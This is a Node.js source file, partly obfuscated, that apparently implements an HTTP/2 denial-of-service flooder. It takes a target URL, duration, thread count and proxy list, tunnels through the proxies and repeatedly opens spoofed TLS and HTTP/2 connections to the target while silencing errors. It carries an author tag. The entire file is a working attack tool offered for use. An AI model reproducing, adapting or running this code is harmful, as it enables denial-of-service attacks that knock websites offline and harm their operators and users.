const net = require("net");
const http2 = require("http2");
const tls = require('tls');
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require('fs');
var colors = require("colors");
const randomUseragent = require("random-useragent");
const uap = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36", "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9", "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4", "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240", "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0", "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.62", "Mozilla/5.0 (Linux; Android 12; POCO F1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 8.1.0; W-K130-TMV Build/OPM2.171019.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 4.4.2; MITO T10 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Safari/537.36", "Mozilla/5.0 (Linux; Android 10; moto g(7) plus Build/QPWS30.61-21-18-7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 9; SM-G800H Build/PQ3A.190801.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.114 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 9; TECNO AB7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36", "Mozilla/5.0 (Linux; 6.0; Nomi i5010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; moto g stylus 5G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; SAMSUNG moto g stylus 5G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36", "Mozilla/5.0 (Linux; U; Android 3.2; en-us; Sony Tablet S Build/THMAS11000) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13", "Mozilla/5.0 (Linux; Android 7.1.1; SM-J510MN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.166 Mobile Safari/537.36 OPR/65.2.3381.61420", "Mozilla/5.0 (Linux; Android 8.0.0; SM-G930R4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36", "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko", "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/118.0.5993.69 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36", "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/112.0.5615.46 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (Linux; Android 11; Infinix X689C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4504021560267656607 t3426302838546509975 ath1fb31b7a altpriv cvcv=2 smf=0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v5534684115277472898 t3426302838546509975 ath1fb31b7a altpriv cvcv=2 smf=0", "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1"];
const accept_header = ['text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8', "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'];
const cache_header = ["max-age=0", "no-cache", "no-store", "pre-check=0", "post-check=0", 'must-revalidate', "proxy-revalidate", "s-maxage=604800", "no-cache, no-store,private, max-age=0, must-revalidate", "no-cache, no-store,private, s-maxage=604800, must-revalidate", "no-cache, no-store,private, max-age=604800, must-revalidate"];
const Generate_Encoding = ['*', 'br', "gzip, deflate", "br;q=1.0, gzip;q=0.8, *;q=0.1", "gzip", "gzip, compress", "compress, deflate", "compress", "gzip, deflate, br", 'deflate'];
const language_header = ['he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7', "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5", 'en-US,en;q=0.5', "en-US,en;q=0.9", "de-CH;q=0.7", "da, en-gb;q=0.8, en;q=0.7", "cs;q=0.5", 'nl-NL,nl;q=0.9', "nn-NO,nn;q=0.9", 'or-IN,or;q=0.9', "pa-IN,pa;q=0.9", "pl-PL,pl;q=0.9", "pt-BR,pt;q=0.9", "pt-PT,pt;q=0.9", "ro-RO,ro;q=0.9", "ru-RU,ru;q=0.9", 'si-LK,si;q=0.9', 'sk-SK,sk;q=0.9', "sl-SI,sl;q=0.9", "sq-AL,sq;q=0.9", "sr-Cyrl-RS,sr;q=0.9", "sr-Latn-RS,sr;q=0.9", "sv-SE,sv;q=0.9", 'sw-KE,sw;q=0.9', "ta-IN,ta;q=0.9", "te-IN,te;q=0.9", 'th-TH,th;q=0.9', "tr-TR,tr;q=0.9", "uk-UA,uk;q=0.9", 'ur-PK,ur;q=0.9', 'uz-Latn-UZ,uz;q=0.9', "vi-VN,vi;q=0.9", "zh-CN,zh;q=0.9", "zh-HK,zh;q=0.9", 'zh-TW,zh;q=0.9', "am-ET,am;q=0.8", 'as-IN,as;q=0.8', 'az-Cyrl-AZ,az;q=0.8', "bn-BD,bn;q=0.8", "bs-Cyrl-BA,bs;q=0.8", "bs-Latn-BA,bs;q=0.8", "dz-BT,dz;q=0.8", "fil-PH,fil;q=0.8", 'fr-CA,fr;q=0.8', "fr-CH,fr;q=0.8", "fr-BE,fr;q=0.8", 'fr-LU,fr;q=0.8', "gsw-CH,gsw;q=0.8", "ha-Latn-NG,ha;q=0.8", "hr-BA,hr;q=0.8", "ig-NG,ig;q=0.8", "ii-CN,ii;q=0.8", "is-IS,is;q=0.8", 'jv-Latn-ID,jv;q=0.8', "ka-GE,ka;q=0.8", "kkj-CM,kkj;q=0.8", "kl-GL,kl;q=0.8", "km-KH,km;q=0.8", "kok-IN,kok;q=0.8", "ks-Arab-IN,ks;q=0.8", 'lb-LU,lb;q=0.8', 'ln-CG,ln;q=0.8', "mn-Mong-CN,mn;q=0.8", "mr-MN,mr;q=0.8", "ms-BN,ms;q=0.8", "mt-MT,mt;q=0.8", 'mua-CM,mua;q=0.8', "nds-DE,nds;q=0.8", "ne-IN,ne;q=0.8", "nso-ZA,nso;q=0.8", "oc-FR,oc;q=0.8", 'pa-Arab-PK,pa;q=0.8', "ps-AF,ps;q=0.8", "quz-BO,quz;q=0.8", 'quz-EC,quz;q=0.8', "quz-PE,quz;q=0.8", "rm-CH,rm;q=0.8", "rw-RW,rw;q=0.8", "sd-Arab-PK,sd;q=0.8", 'se-NO,se;q=0.8', "si-LK,si;q=0.8", "smn-FI,smn;q=0.8", 'sms-FI,sms;q=0.8', "syr-SY,syr;q=0.8", "tg-Cyrl-TJ,tg;q=0.8", "ti-ER,ti;q=0.8", "tk-TM,tk;q=0.8", "tn-ZA,tn;q=0.8", "tt-RU,tt;q=0.8", "ug-CN,ug;q=0.8", "uz-Cyrl-UZ,uz;q=0.8", "ve-ZA,ve;q=0.8", "wo-SN,wo;q=0.8", "xh-ZA,xh;q=0.8", "yo-NG,yo;q=0.8", "zgh-MA,zgh;q=0.8", 'zu-ZA,zu;q=0.8'];
const dest_header = ["audio", "audioworklet", 'document', "embed", "empty", "font", "frame", "iframe", "image", 'manifest', "object", "paintworklet", "report", 'script', "serviceworker", "sharedworker", "style", "track", "video", "worker", "xslt"];
const platform = ['Windows', "Linux", "iPhone"];
const mode_header = ["cors", "navigate", "no-cors", "same-origin", 'websocket'];
const site_header = ['cross-site', "same-origin", "same-site", "none"];
const sec_ch_ua = ["\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"", "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Brave\";v=\"114\""];
process.setMaxListeners(0x0);
require("events").EventEmitter.defaultMaxListeners = 0x0;
if (process.argv.length < 0x7) {
  console.log("Usage: host time req thread GET proxy.txt");
  process.exit();
}
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(':');
const ciphers = "GREASE:" + [defaultCiphers[0x2], defaultCiphers[0x1], defaultCiphers[0x0], ...defaultCiphers.slice(0x3)].join(':');
const sigalgs = ["ecdsa_secp256r1_sha256", "ecdsa_secp384r1_sha384", 'ecdsa_secp521r1_sha512', "rsa_pss_rsae_sha256", 'rsa_pss_rsae_sha384', "rsa_pss_rsae_sha512", 'rsa_pkcs1_sha256', "rsa_pkcs1_sha384", "rsa_pkcs1_sha512"];
let SignalsList = sigalgs.join(':');
"GREASE:X25519:x25519:P-256:P-384:P-521:X448";
const secureOptions = crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1 | crypto.constants.ALPN_ENABLED | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE | crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT | crypto.constants.SSL_OP_COOKIE_EXCHANGE | crypto.constants.SSL_OP_PKCS1_CHECK_1 | crypto.constants.SSL_OP_PKCS1_CHECK_2 | crypto.constants.SSL_OP_SINGLE_DH_USE | crypto.constants.SSL_OP_SINGLE_ECDH_USE | crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
const headers = {};
const secureContextOptions = {
  'ciphers': ciphers,
  'sigalgs': SignalsList,
  'honorCipherOrder': true,
  'secureOptions': secureOptions,
  'secureProtocol': "TLS_client_method"
};
const secureContext = tls.createSecureContext(secureContextOptions);
const args = {
  'target': process.argv[0x2],
  'time': ~~process.argv[0x3],
  'Rate': ~~process.argv[0x4],
  'threads': ~~process.argv[0x5],
  'method': ~~process.argv[0x6],
  'proxyFile': process.argv[0x7]
};
var proxies = fs.readFileSync(args.proxyFile, "utf-8").toString().split(/\r?\n/);
const parsedTarget = url.parse(args.target);
if (cluster.isMaster) {
  for (let counter = 0x1; counter <= args.threads; counter++) {
    console.clear();
    console.log('zai'.blue);
    console.log("@F0CK3T".blue);
    cluster.fork();
  }
} else {
  for (let i = 0x0; i < 0xa; i++) {
    setInterval(runFlooder, 0x0);
  }
}
class NetSocket {
  constructor() {}
  ["HTTP"](_0x3ea1c5, _0xdee760) {
    const _0x14364b = "CONNECT " + _0x3ea1c5.address + ":443 HTTP/1.1\r\nHost: " + _0x3ea1c5.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
    const _0x2282c4 = new Buffer.from(_0x14364b);
    const _0x536df2 = net.connect({
      'host': _0x3ea1c5.host,
      'port': _0x3ea1c5.port,
      'allowHalfOpen': true,
      'writable': true,
      'readable': true
    });
    _0x536df2.setTimeout(_0x3ea1c5.timeout * 0x2710);
    _0x536df2.setKeepAlive(true, 0xc350);
    _0x536df2.setNoDelay(true);
    _0x536df2.on("connect", () => {
      _0x536df2.write(_0x2282c4);
    });
    _0x536df2.on("data", _0x4f6a1d => {
      const _0x551b69 = _0x4f6a1d.toString("utf-8");
      const _0x20fd62 = _0x551b69.includes("HTTP/1.1 200");
      if (_0x20fd62 === false) {
        _0x536df2.destroy();
        return _0xdee760(undefined, "error: invalid response from proxy server");
      }
      return _0xdee760(_0x536df2, undefined);
    });
    _0x536df2.on("timeout", () => {
      _0x536df2.destroy();
      return _0xdee760(undefined, "error: timeout exceeded");
    });
    _0x536df2.on("error", _0x2e4c4c => {
      _0x536df2.destroy();
      return _0xdee760(undefined, "error: " + _0x2e4c4c);
    });
  }
}
function cookieString(_0xab73f4) {
  var _0x4b456d = '';
  for (var _0x327860 in _0xab73f4) {
    _0x4b456d = _0x4b456d + " " + _0xab73f4[_0x327860].name + '=' + _0xab73f4[_0x327860].value + ';';
  }
  var _0x4b456d = _0x4b456d.substring(0x1);
  return _0x4b456d.substring(0x0, _0x4b456d.length - 0x1);
}
const Socker = new NetSocket();
function readLines(_0xf55b75) {
  return fs.readFileSync(_0xf55b75, "utf-8").toString().split(/\r?\n/);
}
function randomIntn(_0x1d4562, _0x130e1e) {
  return Math.floor(Math.random() * (_0x130e1e - _0x1d4562) + _0x1d4562);
}
function randomElement(_0x14ab3d) {
  return _0x14ab3d[Math.floor(Math.random() * (_0x14ab3d.length - 0x0) + 0x0)];
}
function getRandomUserAgent() {
  const _0x50faac = ["Windows", "Windows NT 10.0", "Windows NT 6.1", "Windows NT 6.3", 'Macintosh', "Android", "Linux"];
  const _0xb322b5 = ["Chrome", "Firefox", 'Safari', "Edge", "Opera"];
  const _0xc24a8f = ["en-US", 'en-GB', "fr-FR", "de-DE", "es-ES"];
  const _0x58a54b = ['US', 'GB', 'FR', 'DE', 'ES'];
  const _0x320aad = ['Windows', "Apple", "Google", "Microsoft", "Mozilla", "Opera Software"];
  const _0x49fda8 = _0x50faac[Math.floor(Math.random() * _0x50faac.length)];
  const _0x19d0ea = _0xb322b5[Math.floor(Math.random() * _0xb322b5.length)];
  const _0x248d37 = _0xc24a8f[Math.floor(Math.random() * _0xc24a8f.length)];
  const _0x239fef = _0x58a54b[Math.floor(Math.random() * _0x58a54b.length)];
  const _0x2398ea = _0x320aad[Math.floor(Math.random() * _0x320aad.length)];
  const _0x304cec = Math.floor(Math.random() * 0x64) + 0x1;
  const _0xf802a7 = Math.floor(Math.random() * 0x6) + 0x1;
  const _0x15e2d2 = _0x2398ea + '/' + _0x19d0ea + " " + _0x304cec + '.' + _0x304cec + '.' + _0x304cec + " (" + _0x49fda8 + "; " + _0x239fef + "; " + _0x248d37 + ')';
  const _0x472211 = btoa(_0x15e2d2);
  let _0x209dd0 = '';
  for (let _0x13e6f2 = 0x0; _0x13e6f2 < _0x472211.length; _0x13e6f2++) {
    if (_0x13e6f2 % _0xf802a7 === 0x0) {
      _0x209dd0 += _0x472211.charAt(_0x13e6f2);
    } else {
      _0x209dd0 += _0x472211.charAt(_0x13e6f2).toUpperCase();
    }
  }
  return _0x209dd0;
}
function runFlooder() {
  const _0x2a30bc = proxies[Math.floor(Math.random() * (proxies.length - 0x0) + 0x0)];
  const _0x224174 = _0x2a30bc.split(':');
  const _0x2a70f7 = parsedTarget.protocol == "https:" ? '443' : '80';
  const _0x4108e0 = {
    'host': _0x224174[0x0],
    'port': ~~_0x224174[0x1],
    'address': parsedTarget.host + ':443',
    'timeout': 0x64
  };
  Socker.HTTP(_0x4108e0, (_0x3f5c90, _0x26bdc3) => {
    if (_0x26bdc3) {
      return;
    }
    _0x3f5c90.setKeepAlive(true, 0xea60);
    _0x3f5c90.setNoDelay(true);
    const _0x44c37b = {
      'enablePush': false,
      'initialWindowSize': 0x3fffffff
    };
    const _0x41e01c = {
      'port': _0x2a70f7,
      'secure': true,
      'ALPNProtocols': ['h2', "spdy/3.1", "http/1.1", "h2c"],
      'ciphers': ciphers,
      'sigalgs': sigalgs,
      'requestCert': true,
      'socket': _0x3f5c90,
      'ecdhCurve': "GREASE:X25519:x25519",
      'honorCipherOrder': false,
      'host': parsedTarget.host,
      'rejectUnauthorized': false,
      'clientCertEngine': "DYNAMIC",
      'secureOptions': secureOptions,
      'secureContext': secureContext,
      'servername': parsedTarget.host,
      'secureProtocol': "TLS_client_method"
    };
    const _0x3c078e = tls.connect(_0x2a70f7, parsedTarget.host, _0x41e01c);
    _0x3c078e.allowHalfOpen = true;
    _0x3c078e.setNoDelay(true);
    _0x3c078e.setKeepAlive(true, 60000);
    _0x3c078e.setMaxListeners(0x0);
    const _0x14f2ca = http2.connect(parsedTarget.href, {
      'protocol': "https:",
      'settings': {
        'headerTableSize': 0x10000,
        'maxConcurrentStreams': 0x64,
        'initialWindowSize': 0x600000,
        'maxHeaderListSize': 0x40000,
        'enablePush': false
      },
      'maxSessionMemory': 0xd05,
      'maxDeflateDynamicTableSize': 0xffffffff,
      'createConnection': () => _0x3c078e,
      'socket': _0x3f5c90
    });
    _0x14f2ca.settings({
      'headerTableSize': 0x10000,
      'maxConcurrentStreams': 0x64,
      'initialWindowSize': 0x600000,
      'maxHeaderListSize': 0x40000,
      'enablePush': false
    });
    _0x14f2ca.setMaxListeners(0x0);
    _0x14f2ca.settings(_0x44c37b);
    _0x14f2ca.on("connect", () => {});
    _0x14f2ca.on("close", () => {
      _0x14f2ca.destroy();
      _0x3f5c90.destroy();
      return;
    });
    _0x14f2ca.on("error", _0x4b837f => {
      _0x14f2ca.destroy();
      _0x3f5c90.destroy();
      return;
    });
  });
}
const StopScript = () => process.exit(0x1);
setTimeout(StopScript, args.time * 0x3e8);
process.on("uncaughtException", _0x4c608c => {});
process.on("unhandledRejection", _0x5f250c => {});